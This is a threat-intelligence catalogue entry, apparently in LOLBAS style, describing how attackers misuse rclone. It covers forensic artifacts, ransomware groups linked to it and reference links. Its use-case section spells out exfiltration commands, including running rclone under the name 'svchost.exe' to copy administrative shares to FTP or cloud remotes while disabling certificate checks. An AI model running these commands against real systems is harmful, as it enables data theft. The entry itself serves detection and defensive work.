Name: rclone
Aliases:
  - rclone.exe
Description: >
  rclone is a command-line program for managing files on cloud storage. It supports over 40 cloud storage providers
  and enables syncing, copying, and transferring data. Adversaries abuse rclone to exfiltrate data due to its ability
  to interface with cloud storage and run in stealth using custom configurations and renamed binaries.
Category: third-party
Platform:
  - Windows
  - Linux
  - macOS
Execution:
  - cli
  - script
Capabilities:
  - file-sync
  - encrypted-transfer
  - cloud-sync
  - background-execution
  - stealth-upload
  - direct-to-cloud
  - protocol-tunneling
Stealth:
  - masquerading
  - encrypted-transfer
  - background-execution
  - proxy-support
  - scriptable-execution
Forensics:
  BinaryLocations:
    - C:\Users\<user>\rclone.exe
    - /usr/bin/rclone
  CommandLineArgs:
    - copy
    - sync
    - --config
    - --ignore-existing
    - --auto-confirm
    - --multi-thread-streams
    - --transfers
    - --progress
    - --no-check-certificate
  NetworkArtifacts:
    - TLS connections to cloud endpoints
    - FTP uploads
    - Multiple file upload events
  ConfigFiles:
    - C:\Users\<username>\AppData\Roaming\rclone\rclone.conf
    - ~/.config/rclone/rclone.conf
  ScheduledTask: []
ThreatActors:
  - REvil
  - Quantum
  - Akira
  - Conti
References:
  - https://www.trendmicro.com/en_us/research/22/h/attackers-abuse-rclone-and-megasync-to-exfiltrate-data.html
  - https://www.sentinelone.com/blog/how-rclone-became-a-favorite-tool-for-ransomware-data-exfiltration/
  - https://www.crowdstrike.com/blog/rclone-the-new-threat-for-data-exfiltration/
  - https://unit42.paloaltonetworks.com/threat-assessment-rclone-data-exfiltration/
Tags:
  - third-party
  - cli
  - cloud-based
  - encrypted-transfer
  - masquerading
  - persistent
  - stealth
  - scriptable
  - common-lolbas
UseCases:
  - Title: Standard cloud upload
    Description: Upload a directory to remote cloud storage using default config.
    Command: rclone copy /data remote:backup

  - Title: Masqueraded exfiltration with custom config
    Description: Masqueraded rclone binary used with renamed config to perform exfiltration.
    Command: |
      svchost.exe --config svchost.conf --progress --no-check-certificate copy "\\Server\C$\Share" ftp1:/domain/share

  - Title: Ransomware-style exfiltration with filtering
    Description: Copy data while excluding file types and using multiple threads to speed up the upload.
    Command: |
      rclone.exe copy --max-age 5y "\\BACKUP\E:\" remote:Groups --exclude "*.{psd,rar,zip}"
      --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12 -P

  - Title: FTP exfiltration with minimal footprint
    Description: Send data to an FTP server while skipping known extensions and logging minimal output.
    Command: |
      rclone copy \\192.168.1.100\f$ st:"/home/user/data" --max-age 1y
      --exclude "*.{iso,exe,zip}" --ignore-existing --auto-confirm -q --transfers 5 -P
